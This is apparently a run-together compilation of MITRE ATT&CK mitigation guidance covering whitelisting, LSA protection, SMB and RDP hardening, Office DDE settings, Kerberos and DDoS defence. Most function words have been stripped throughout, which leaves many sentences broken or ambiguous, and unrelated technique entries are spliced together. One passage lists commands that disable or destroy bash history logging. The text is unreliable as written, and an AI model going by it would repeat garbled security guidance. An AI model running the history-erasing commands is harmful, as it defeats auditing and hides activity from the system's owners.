strong passwords refrain key-store technologies ssh-agent properly protected. Ensure private stored securely locations legitimate owner access strong passwords rotated frequently. Ensure proper file permissions set harden prevent root privilege escalation opportunities. remote access SSH root privileged accounts. Ensure agent forwarding disabled systems explicitly require feature prevent misuse. (Citation: Symantec SSH ssh-agent) implementing disaster recovery plans procedures regularly testing data backups restore organizational data.(Citation: Ready.gov DRP)

In cases, decrypt files ransomware campaign released public. trusted sources public releases decryptor tools/keys reverse effects ransomware.

Identify malicious software audit block whitelisting(Citation: Beechey 2010) tools, AppLocker,(Citation: Windows Commands JPCERT)(Citation: NSA AppLocker) Software Restriction Policies(Citation: Corio 2008) appropriate.(Citation: TechNet Applocker SRP) Identify utilities, remote access third-party tools, users malicious software store compressed encrypted data publicly writeable directory, central location, commonly staging directories (e.g. recycle bin) indicative non-standard behavior, audit block file integrity monitoring tools appropriate. applying data size limits blocking file writes common compression encryption utilities 7zip, RAR, ZIP, zlib frequently staging directories central locations monitor attempted violations restrictions. Networks development testing content users set servers enterprise network vulnerable systems servers properly secured limit privileged account use, unauthenticated network share access, network/system isolation.

Ensure proper permissions directories accessible server. Disallow remote access webroot directories serve content. Disable execution directories webroot. Ensure permissions server process required built-in accounts; instead, create specific accounts limit unnecessary access permissions overlap multiple systems. (Citation: acunetix Server Secuirty) (Citation: NIST Server Security July 2008) Common tools detecting Linux rootkits include: rkhunter (Citation: SourceForge rkhunter), chrootkit (Citation: Chkrootkit Main), rootkits designed evade detection tools.

LKMs Kernel extensions require root level permissions installed. Limit access root account prevent users loading kernel modules extensions proper privilege separation limiting Privilege Escalation opportunities.

Application whitelisting software restriction tools, SELinux, aide restricting kernel module loading. (Citation: Kernel.org Restrict Kernel Module) store credentials Registry. Proactively search credentials Registry attempt remediate risk. software store credentials, ensure accounts limited permissions abused adversary. creating security rules, avoid exclusions based file file path. Require signed binaries. file access controls protect folders C:\Windows\System32. tools restrict program execution whitelisting attributes file name.

Identify malicious software legitimate program based location, audit block whitelisting (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Firewalls proxies enforce external network communication policy. difficult organization block services commonly business.

Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific protocol encoded commands adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) Identify malicious software audit block whitelisting(Citation: Beechey 2010) tools, AppLocker,(Citation: Windows Commands JPCERT)(Citation: NSA AppLocker) Software Restriction Policies(Citation: Corio 2008) appropriate.(Citation: TechNet Applocker SRP) Ensure wireless traffic encrypted appropriately. Kerberos, SSL, multifactor authentication possible. Monitor switches network span port usage, ARP/DNS poisoning, router reconfiguration.

Identify block malicious software sniff analyze network traffic whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Block execution code application control, script blocking. Mitigating discovery password policies advised required systems users network. Ensure password policies mitigate brute force attacks adversary advantage policies light. Active Directory common set enforce password policies enterprise network. (Citation: Password Complexity) capabilities prevent successful credential access adversaries; including blocking forms credential dumping. Set account lockout policies failed login attempts prevent passwords guessed. 
Too strict policy create denial service condition render environments un-usable, accounts locked-out permanently. multifactor authentication. Follow practices mitigating access [Valid Accounts](https://attack.mitre.org/techniques/T1078)

Refer NIST guidelines creating passwords.(Citation: NIST 800-63-3)

Where possible, enable multi factor authentication external facing services. Mitigation difficult instances adversary access channel learn techniques tools blocked resident defenses. Exercising practices configuration security ensuring proper process investigation potential compromise essential detecting larger intrusion discrete alerts.

Identify block malicious software adversary whitelisting (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) files immutable changeable administrators limit ability adversaries easily create user level persistence. signed scripts execute programs environment. application whitelisting configured block execution scripts required network prevent potential misuse adversaries. Command control infrastructure multi-stage channel blocked time. unique signatures C2 traffic, basis identifying blocking channel. (Citation: University Birmingham C2) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific protocol adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) Blocking software based screen capture functionality difficult, legitimate software performs actions. Instead, identify malicious software functionality acquire screen captures, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) potential legitimate source commands, difficult mitigate technique. Disable RDP service unnecessary, remove unnecessary accounts Remote Desktop Users groups, enable firewall rules block RDP traffic network security zones. Audit Remote Desktop Users membership regularly. Remove local Administrators list allowed log RDP. Limit remote user permissions remote access necessary. remote desktop gateways multifactor authentication remote logins. (Citation: Berkley Secure) leave RDP accessible internet. Change GPOs define shorter timeouts sessions maximum time single session active. Change GPOs maximum time disconnected session stays active session host server. (Citation: Windows RDP Sessions) Disable LLMNR NetBIOS local security settings policy environment. (Citation: ADSecurity Windows Secure Baseline)

Use host-based security software block LLMNR/NetBIOS traffic. Enabling SMB Signing NTLMv2 relay attacks.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)(Citation: SMB Packet Signing) user training bring awareness common phishing spearphishing techniques raise suspicion malicious events. Application whitelisting prevent running executables masquerading files.

If link visited user, block unknown unused files transit default downloaded policy suspicious sites practice prevent vectors, .scr, .exe, .lnk, .pif, .cpl, etc. download scanning devices analyze compressed encrypted formats, zip RAR conceal malicious files [Obfuscated Files Information](https://attack.mitre.org/techniques/T1027).

If link visited user, network intrusion prevention systems systems designed scan remove malicious downloads block activity. Solutions signature behavior based, adversaries construct files avoid systems. Establish network access control policies, device certificates 802.1x standard. (Citation: Wikipedia 802.1x) Restrict DHCP registered devices prevent unregistered devices communicating trusted systems. 

Block unknown devices accessories endpoint security configuration monitoring agent. password user's login keychain changed user's login password. increases complexity adversary additional password. unused features restrict access scripting engines VBScript scriptable administration frameworks PowerShell.

Configure Office security settings enable Protected View, execute sandbox environment, block macros Policy. (Citation: Block Office Macros) types virtualization application microsegmentation mitigate impact compromise. risks additional exploits weaknesses implementation exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape) Enforce binary application integrity digital signature verification prevent untrusted code executing. Mitigation timestomping difficult. Efforts focused preventing malicious software running. Identify block malicious software functionality perform timestomping whitelisting (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Prevent administrator accounts enumerated application elevating UAC lead disclosure account names. Registry key located <code>HKLM\ SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\CredUI\EnumerateAdministrators</code>. disabled GPO: Configuration > [Policies] > Administrative Templates > Windows Components > Credential User Interface: numerate administrator accounts elevation. (Citation: UCF STIG Elevation Account Enumeration)

Identify unnecessary utilities malicious software acquire domain accounts, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Implementing practices websites defending [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) (Citation: OWASP 2017). implementing disaster recovery plans procedures regular data backups restore organizational data. (Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access destroy backups prevent recovery. Prevent modification environment variables unauthorized users groups. Holding Shift key logging prevents apps automatically (Citation: Re-Open windows Mac). feature disabled terminal command: <code>defaults write -g ApplePersistence -bool no</code>. Identify block malicious software persist manner whitelisting (Citation: Beechey 2010) tools capable monitoring DLL loads Windows utilities AppLocker. (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) inspect HTTPS traffic, captures analyzed connections Domain Fronting.

In domain fronting, attackers deploy additional tools compromised systems. (Citation: FireEye APT29 Domain Fronting TOR March 2017) (Citation: Mandiant Easy Breach) detect prevent installation tools Host-based solutions. data loss prevention (DLP) strategy categorize sensitive data, identify data formats indicative personal identifiable (PII), restrict exfiltration sensitive data.(Citation: PurpleSec Data Loss Prevention) flood volumes exceed capacity network connection targeted, typically intercept incoming traffic upstream filter attack traffic legitimate traffic. defenses hosting Internet Service Provider (ISP) 3rd party Content Delivery Network (CDN) providers specializing DoS mitigations.(Citation: CERT-EU DDoS March 2017)

Depending flood volume, on-premises filtering blocking source addresses sourcing attack, blocking ports targeted, blocking protocols transport.(Citation: CERT-EU DDoS March 2017)

As response require rapid engagement 3rd parties, analyze risk critical resources Network DoS attacks create disaster recovery plan/business continuity plan respond incidents.(Citation: CERT-EU DDoS March 2017) Application isolation privilege lesson impact exploit. Application isolation limit processes features exploited target access, privilege service accounts limit permissions exploited process rest system. Application Firewalls limit exposure applications.

Segment externally facing servers services rest network DMZ separate hosting infrastructure.

Use secure coding practices designing custom software meant deployment externally facing systems. Avoid issues documented OWASP, CWE, software weakness identification efforts.

Regularly scan externally facing systems vulnerabilities establish procedures rapidly patch systems critical vulnerabilities discovered scanning public disclosure. Prevent adversary access privileged accounts access perform technique.

Consider removing replacing components suspected compromised. Identify unnecessary utilities malicious software acquire system's network configuration, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Automatically events log server data repository prevent conditions adversary locate manipulate data local system. possible, minimize time delay event reporting avoid prolonged storage local system. Protect generated event files stored locally proper permissions authentication limit opportunities adversaries increase privileges preventing Privilege Escalation opportunities. Obfuscate/encrypt event files locally transit avoid feedback adversary. Enforce valid digital signatures signed code applications trust applications signatures trusted parties. Block SMB  traffic exiting enterprise network egress filtering blocking TCP ports 139, 445 UDP port 137. Filter block WebDAV protocol traffic exiting network. access external resources SMB WebDAV necessary, traffic tightly limited whitelisting. (Citation: US-CERT SMB Security) (Citation: US-CERT APT Energy Oct 2017)

For internal traffic, monitor workstation-to-workstation unusual (vs. baseline) SMB traffic. networks any, depends systems network configured resources located.

Use strong passwords increase difficulty credential hashes cracked obtained. Prevent adversary access privileged accounts access perform technique. Check integrity existing BIOS device firmware determine vulnerable modification. Patch BIOS firmware prevent successful vulnerabilities.  Protect processes privileges interact critical components protected process light, anti-process injection defenses, process integrity enforcement measures. Traffic anonymity networks C2 infrastructure blocked network black white lists. blocking circumvented techniques [Domain Fronting](https://attack.mitre.org/techniques/T1172). [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) msxsl.exe environment. Disabling WMI instability evaluated assess impact network. msxsl.exe unnecessary, block execution prevent abuse adversaries. Enforce binaries signed correct Apple Developer IDs, whitelist applications hashes. Binaries baselined dynamic libraries require, app requires dynamic library wasn’t included update, investigated. category associate techniques mitigation increase risk compromise mitigation recommended. category applicable mitigation activities apply techniques occurring adversary gains Initial Access, Reconnaissance Resource Development techniques. Network segmentation isolate infrastructure components require broad network access. Properly manage accounts permissions parties trusted relationships minimize potential abuse party party compromised adversary. Vet security policies procedures organizations contracted require privileged access network resources. Update software regularly. Install software write-protected locations. program sxstrace.exe included Windows manual inspection check manifest files side-loading vulnerabilities software. Drive-by compromise relies vulnerable piece software client systems. modern browsers security features on. Ensure browsers plugins updated prevent exploit phase technique.

For malicious code served ads, adblockers prevent code executing place. Script blocking extensions prevent execution JavaScript commonly exploitation process.

Browser sandboxes mitigate impact exploitation, sandbox escapes exist. (Citation: Windows Blogs Edge Sandbox) (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Other types virtualization application microsegmentation mitigate impact client-side exploitation. risks additional exploits weaknesses implementation exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Security applications behavior exploitation Windows Defender Exploit Guard (WDEG) Enhanced Mitigation Experience Toolkit (EMET) mitigate exploitation behavior. (Citation: TechNet Moving EMET) Control flow integrity checking identify software exploit occurring. (Citation: Wikipedia Control Flow Integrity) protections depend architecture target application binary compatibility. Windows 8.1 Server 2012 R2, enable LSA Protection setting Registry key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL</code> <code>dword:00000001</code>. (Citation: LSA Protection Mar 2014) LSA Protection ensures LSA plug-ins drivers loaded digitally signed signature adhere Security Development Lifecycle (SDL) process guidance.

On Windows Server 2016, enable Windows Defender Credential Guard (Citation: Enable Cred Guard April 2017) lsass.exe isolated virtualized environment device drivers. (Citation: Credential Guard April 2017)

Ensure safe DLL search mode enabled <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</code> mitigate risk lsass.exe loads malicious code library. (Citation: DLL Security) type attack technique easily mitigated preventive controls based abuse operating design features. example, mitigating hooking unintended effects, preventing legitimate software (i.e., security products) operating properly. Efforts focused preventing adversary tools running earlier chain activity identifying subsequent malicious behavior. Break inspect SSL/TLS sessions encrypted traffic adversary activity. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific protocol adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) type attack technique easily mitigated preventive controls based abuse operating design features. example, mitigating specific API calls unintended effects, preventing legitimate software (i.e., security products) operating properly. Efforts focused preventing adversary tools running earlier chain activity identifying subsequent malicious behavior. 

Although process hollowing evade types defenses, practice identify malicious software perform adversarial actions audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) secure methods boot verify integrity operating loading mechanisms. Identify unnecessary utilities malicious software collect data local system, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) potential legitimate trap commands, difficult mitigate technique. Registry specific Office feature control security set disable automatic DDE/OLE execution. (Citation: DDE Advisory Nov 2017) (Citation: BleepingComputer DDE Disabled Word Dec 2017) (Citation: GitHub Disable DDEAUTO Oct 2017) created, enabled default, Registry completely disable DDE execution Word Excel. (Citation: ADV170021 Dec 2017)

Ensure Protected View enabled (Citation: Protected View) disabling embedded files Office programs, OneNote, enrolled Protected View. (Citation: Enigma Reviving DDE Jan 2018) (Citation: GitHub Disable DDEAUTO Oct 2017)

On Windows 10, enable Attack Surface Reduction (ASR) rules prevent DDE attacks spawning child processes Office programs. (Citation: ASR Nov 2017) (Citation: Enigma Reviving DDE Jan 2018) Leverage services Content Delivery Networks (CDN) providers specializing DoS mitigations filter traffic upstream services.(Citation: CERT-EU DDoS March 2017) Filter boundary traffic blocking source addresses sourcing attack, blocking ports targeted, blocking protocols transport. defend SYN floods, enable SYN Cookies. Benign software legitimate processes gather time. Efforts focused preventing unwanted unknown code executing system. common tools, net.exe, blocked policy prevent common acquiring remote time.

Identify unnecessary utilities malicious software acquire time information, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Process whitelisting trusted publishers verify authenticity software prevent signed malicious untrusted code executing system. (Citation: NSA AppLocker) (Citation: TechNet Trusted Publishers) (Citation: Securelist Digital Certificates) creation modification systemd service unit files administrators Linux root user users superuser privileges. Limit user access utilities systemctl users legitimate need. Restrict read/write access systemd unit files select privileged users legitimate manage services. Additionally, installation software commonly adds systemd service unit files. Restrict software installation trusted repositories cautious orphaned software packages. Utilize malicious code protection application whitelisting mitigate ability malware create modify systemd services.  Mitigation technique difficult unadvised legitimate hidden files directories. Architect sections network isolate critical systems, functions, resources. physical logical segmentation prevent access sensitive systems information. DMZ internet-facing services exposed internal network. Configure separate virtual private cloud (VPC) instances isolate critical cloud systems. threat intelligence program helps organization generate threat intelligence track trends inform defensive priorities mitigate risk. technique exploits users' tendencies supply credentials prompted, difficult mitigate. user training bring awareness raise suspicion malicious events (ex: Office documents prompting credentials). Identify block malicious software executed key startup folder persistence whitelisting (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Encryption off-system storage sensitive mitigate collection files, adversary acquiring intrusion persists period time adversary discover access data means. keylogger installed intercept passwords [Input Capture](https://attack.mitre.org/techniques/T1056) decrypt protected documents adversary collected. Strong passwords prevent offline cracking encrypted documents [Brute Force](https://attack.mitre.org/techniques/T1110) techniques.

Identify unnecessary utilities, third-party tools, malicious software collect files audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature block methods rundll32.exe bypass whitelisting. (Citation: Secure Host Baseline EMET) Network intrusion prevention systems systems designed scan remove malicious email attachments block activity. Solutions signature behavior based, adversaries construct attachments avoid systems.

Block unknown unused attachments default transmitted email practice prevent vectors, .scr, .exe, .pif, .cpl, etc. email scanning devices analyze compressed encrypted formats, zip rar conceal malicious attachments [Obfuscated Files Information](https://attack.mitre.org/techniques/T1027).

Because technique involves user interaction endpoint, difficult mitigate. However, potential mitigations. Users trained identify social engineering techniques spearphishing emails. prevent attachments executing, application whitelisting used. Anti-virus automatically quarantine suspicious files. Identify malicious software access logical drives manner, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Set enforce secure password policies accounts. capabilities prevent suspicious behavior patterns occurring endpoint systems. include suspicious process, file, API call, etc. behavior. Modify Registry settings (directly Dcomcnfg.exe) <code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppID\{AppID_GUID}</code> process-wide security individual applications. (Citation: Process Wide Keys)

Modify Registry settings (directly Dcomcnfg.exe) <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole</code> system-wide security defaults applications set process-wide security. (Citation: Wide Keys) (Citation: ACL)

Consider disabling DCOM Dcomcnfg.exe. (Citation: Disable DCOM)

Enable Windows firewall, prevents DCOM instantiation default.

Ensure alerts Protected View enabled. (Citation: Protected View) CMSTP.exe environment (unless VPN connection installation). application whitelisting configured block execution CMSTP.exe required network prevent potential misuse adversaries. (Citation: MSitPros CMSTP Aug 2017) Mitigations command control apply. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific obfuscation technique adversary tool, malware families versions. Adversaries change tool command control signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) Update software regularly employing patch management internal enterprise endpoints servers. Develop robust cyber threat intelligence capability determine types levels threat software exploits 0-days organization. difficult adversaries advance operation exploitation undiscovered unpatched vulnerabilities sandboxing, available. types virtualization application microsegmentation mitigate impact types client-side exploitation. risks additional exploits weaknesses implementation exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Security applications behavior exploitation Windows Defender Exploit Guard (WDEG) Enhanced Mitigation Experience Toolkit (EMET) mitigate exploitation behavior. (Citation: TechNet Moving EMET) Control flow integrity checking identify software exploit occurring. (Citation: Wikipedia Control Flow Integrity) protections depend architecture target application binary compatibility software components targeted privilege escalation. Ensure proper permissions set Registry hives prevent users modifying components lead privilege escalation.

Identify block malicious software executed service abuse whitelisting (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) capable auditing blocking unknown programs. Manage creation, modification, use, permissions user accounts. Windows 8.1, Windows Server 2012 R2, versions, LSA Protected Process Light (PPL) setting Registry key <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL</code>, requires DLLs loaded LSA signed Microsoft. (Citation: Graeber 2014) (Citation: Configure LSA) StartupItems deprecated, preventing users writing <code>/Library/StartupItems</code> directory prevent startup items registered. Similarly, permissions applied specific users edit startup items can’t leveraged privilege escalation. Follow practices mitigation activity establishing [Windows Admin Shares](https://attack.mitre.org/techniques/T1077). 

Identify unnecessary utilities malicious software leverage network shares, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) browser pivoting requires integrity process launch from, restricting user permissions addressing Privilege Escalation [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) opportunities limit exposure technique. 

Close browser sessions regularly needed. Identify block malicious software executed AppCert DLLs whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) capable auditing blocking unknown DLLs. Identify malicious software rootkit functionality, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Ensure proper permissions prevent adversary access privileged accounts perform action. Trusted Platform Module technology secure trusted boot process prevent integrity compromised. (Citation: TCG Trusted Platform Module) (Citation: TechNet Secure Boot Process) Disallow loading remote DLLs. (Citation: DLL Preloading) included default Windows Server 2012+ patch XP+ Server 2003+. (Citation: DLL Search) Path Algorithm

Enable Safe DLL Search Mode force search DLLs directories restrictions (e.g. <code>%SYSTEMROOT%</code>)to local directory DLLs (e.g. user's directory). Safe DLL Search Mode enabled Policy Configuration > [Policies] > Administrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode. Windows Registry key located <code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDLLSearchMode</code> (Citation: DLL Search)

Use auditing tools capable detecting DLL search hijacking opportunities systems enterprise correct them. Toolkits PowerSploit framework PowerUp modules explore systems DLL hijacking weaknesses. (Citation: Powersploit)

Identify block malicious software executed search hijacking whitelisting (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) capable auditing blocking unknown DLLs. Apply supply chain risk management (SCRM) practices procedures (Citation: MITRE Guide 2014), supply chain analysis risk management, life-cycle system.

Leverage established software development lifecycle (SDLC) practices (Citation: NIST Supply Chain 2012): 

* Uniquely Identify Supply Chain Elements, Processes, Actors
* Limit Access Exposure Supply Chain
* Establish Maintain Provenance Elements, Processes, Tools, Data
* Share Strict Limits
* Perform SCRM Awareness Training
* Defensive Design Systems, Elements, Processes
* Perform Continuous Integrator Review
* Strengthen Delivery Mechanisms
* Assure Sustainment Activities Processes
* Manage Disposal Final Disposition Activities Element Life Cycle

A patch management process implemented check unused dependencies, unmaintained vulnerable dependencies, unnecessary features, components, files, documentation. Continuous monitoring vulnerability sources automatic manual code review tools implemented well. (Citation: OWASP 2017) Restrict access setting directory file permissions specific users privileged accounts. enforce multifactor authentication. Follow guidelines prevent limit adversary access [Valid Accounts](https://attack.mitre.org/techniques/T1078) create privileged accounts environment.

Adversaries create local accounts systems limited access network access levels properly locked down. accounts persistence individual systems depends utility reside on.

Protect domain controllers ensuring proper security configuration critical servers. Configure access controls firewalls limit access systems. domain administrator accounts day-to-day operations expose potential adversaries unprivileged systems. Identify unnecessary utilities malicious software acquire remotely systems, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Restrict write access logon scripts specific administrators. Prevent access administrator accounts mitigating Credential Access techniques limiting account access permissions [Valid Accounts](https://attack.mitre.org/techniques/T1078).

Identify block malicious software executed logon script modification whitelisting (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) capable auditing blocking unknown programs. Manage creation, modification, use, permissions privileged accounts, including root. Block .scr files executed non-standard locations. Set Policy force users dedicated screensaver local override settings prevent changes. Policy disable screensavers unnecessary. (Citation: TechNet Screensaver GP) Windows 8.1, Windows Server 2012 R2, versions LSA Protected Process Light (PPL) setting Registry key <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL</code>, requires SSP DLLs signed Microsoft. (Citation: Graeber 2014) (Citation: Configure LSA) Properly configure firewalls proxies limit outgoing traffic ports. 

Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific protocol adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) Limit permissions create symbolic links Windows Administrators virtualization. GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create symbolic links. (Citation: UCF STIG Symbolic Links)

Identify block unknown, malicious software executed shortcut modification whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Identify block malicious software executed time provider whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) capable auditing blocking unknown DLLs.

Consider Policy configure block subsequent modifications W32Time parameters. (Citation: W32Time 2017) Restrict ability modify hives Windows Registry. Ensure strong password (ideally 25+ characters) complexity service accounts passwords periodically expire. (Citation: AdSecurity Cracking Kerberos Dec 2015) Managed Service Accounts party product password vaulting. (Citation: AdSecurity Cracking Kerberos Dec 2015)

Limit service accounts minimal required privileges, including membership privileged Domain Administrators. (Citation: AdSecurity Cracking Kerberos Dec 2015)

Enable AES Kerberos encryption (or stronger encryption algorithm), RC4, possible. (Citation: AdSecurity Cracking Kerberos Dec 2015) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. custom protocol adhere typical protocol standards, opportunities signature traffic network level detection. Signatures unique indicators protocols based specific protocol adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) signatures heuristics detect malicious software. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. encryption protocols typical network-based C2 detection difficult reduced ability signature traffic. Prior knowledge adversary C2 infrastructure domain IP address blocking, effective long-term solution adversaries change infrastructure often. (Citation: University Birmingham C2) Regsvcs Regasm environment. Block execution Regsvcs.exe Regasm.exe required network prevent potential misuse adversaries. Ensure host-based sensors maintain visibility usage network adapters prevent creation possible. (Citation: GPO Bluetooth FEB 2009) (Citation: TechRepublic Wireless GPO FEB 2009) Prevent adversaries gaining access credentials Credential Access log remote desktop sessions systems.

Identify unnecessary utilities, third-party tools, malicious software log remote interactive sessions, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) difficult inadvisable block access EA ADSs. (Citation: ADS Mar 2014) (Citation: Symantec ADS 2009) Efforts focused preventing malicious software running. Identify block malicious software functionality hide EA ADSs whitelisting (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP)

Consider adjusting read write permissions NTFS EA, tested ensure routine OS operations impeded. (Citation: InsiderThreat NTFS EA Oct 2017) multiple methods preventing user's command history flushed .bash_history file, including commands:
<code>set +o history</code> <code>set -o history</code> start logging again;
<code>unset HISTFILE</code> user's .bash_rc file; and
<code>ln -s /dev/null ~/.bash_history</code> write commands <code>/dev/null</code>instead. technique involves user interaction endpoint, difficult mitigate. However, potential mitigations. Users trained identify social engineering techniques spearphishing emails malicious links. Determine websites spearphishing business operations blocking access activity monitored poses risk. mitigations [User Execution](https://attack.mitre.org/techniques/T1204) occurs. type technique easily mitigated preventive controls patched based abuse operating design features. example, blocking file compilation unintended effects, preventing legitimate OS frameworks code development mechanisms operating properly. removing compilers needed, efforts focused preventing adversary tools running earlier chain activity identifying subsequent malicious behavior.

Identify unnecessary utilities malicious software decrypt, deobfuscate, decode, compile files information, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) ### Windows
Monitor/harden access LSASS SAM table tools process whitelisting. Limit credential overlap systems prevent lateral movement opportunities [Valid Accounts](https://attack.mitre.org/techniques/T1078) passwords hashes obtained. Ensure local administrator accounts complex, unique passwords systems network. user admin domain accounts local administrator systems tightly controlled, equivalent local administrator account password systems. Follow practices design administration enterprise network limit privileged account administrative tiers. (Citation: Securing Privileged Access)

On Windows 8.1 Windows Server 2012 R2, enable Protected Process Light LSA. (Citation: LSA)

Identify block malicious software dump credentials whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP)

With Windows 10, implemented protections called Credential Guard protect LSA secrets credentials forms credential dumping. configured default hardware firmware requirements. (Citation: TechNet Credential Guard) protect forms credential dumping. (Citation: GitHub SHB Credential Guard)

Manage access control list “Replicating Directory Changes” permissions domain controller replication. (Citation: AdSecurity DCSync Sept 2015) (Citation: Replication ACL)

Consider disabling restricting NTLM traffic. (Citation: Disable NTLM Nov 2012)

### Linux
